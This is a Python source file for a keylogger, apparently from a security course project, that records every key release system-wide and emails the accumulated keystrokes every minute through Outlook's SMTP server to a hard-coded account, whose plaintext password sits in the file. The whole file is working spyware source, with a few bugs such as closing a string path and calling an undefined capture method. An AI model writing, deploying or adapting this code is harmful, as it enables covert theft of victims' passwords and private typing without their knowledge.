import keyboard
import smtplib # SMTP (Simple Mail Tranfer Protocol)
from threading import Timer
from datetime import datetime
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#PARAMATERS
INTERVAL = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
EMAIL_PASSWORD = "ThisIsAStrongPassword"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # the interval a report is sent
        self.interval = interval
        # how the key strokes are reported
        self.report_method = report_method
        # log of all the keystrokes within `self.interval`
        self.log = ""
        # list of all attachments
        self.attachments = []
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    '''
    update_log: updates the log
    Args:
    - event: the on press event
    '''
    def update_log(self, event):
        name = event.name
        # special key is pressed (e.g ctrl, alt, etc.)
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            else:
                # special keys
                # replace spaces with underscores
                name = name.replace(" ", "_")
                # change to uppercase with []
                name = f"[{name.upper()}]"
                if name == "[ENTER]":
                    # add a new line whenever an ENTER is pressed 
                    name += "\n"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    '''
    prepare_email: formats the email
    Args:
    - message: the key log
    Return:
    - returns the formatted email as a string
    '''
    def prepare_email(self, message, files=None):
        # create mail
        email = MIMEMultipart("alternative")
        email["From"] = EMAIL_ADDRESS
        email["To"] = EMAIL_ADDRESS
        email["Subject"] = "Keylogger logs"
        
        # create message (text and html versions)
        text = MIMEText(message, "plain")
        html = MIMEText(f"<p><b>{message}</b></p>", "html")
        email.attach(text)
        email.attach(html)
        
        # add file attachments to email
        for file in files:
            # open with read and binary mode
            attachment = MIMEApplication(
                    open(file, "rb").read(),
                    Name = basename(file)
                )
            file.close()
            # After the file is closed
            attachment['Content-Disposition'] = f'attachment; filename="{basename(file)}"'
            email.attach(attachment)

        # convert mail to string message
        return email.as_string()

    '''
    send_email: sends the email
    Args:
    - message: the key log
    Return:
    - returns the formatted email as a string
    '''
    def send_email(self, email, password, message, files, verbose=1):
        # manages a connection to an SMTP server (for Microsoft365, Outlook, Hotmail, and live.com)
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to email account
        server.login(email, password)
        # send email
        server.sendmail(email, email, self.prepare_email(message, files))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} with {len(files)} files attached, and containing the message:  {message}")

    def report(self):
        # report log if there is something in the log
        if self.log or self.attachments:
            self.end_dt = datetime.now()
            # self.update_filename()
            # if self.report_method == "email":
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, self.attachments)
            # elif self.report_method == "file":
            #     self.report_to_file()
            # if you don't want to print in the console, comment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            #reset log and attachments
            self.log = ""
            self.attachments = []
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def capture_img(self):
        timer = Timer(interval=(self.interval/2), function=self.capture)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(self.update_log)
        # start capturing the screen

        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


    # def update_filename(self):
    #     # construct the filename to be identified by start & end datetimes
    #     start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    #     end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    #     self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    ''' For reporting to a local file
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    '''

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=INTERVAL, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(INTERVAL)
    keylogger.start()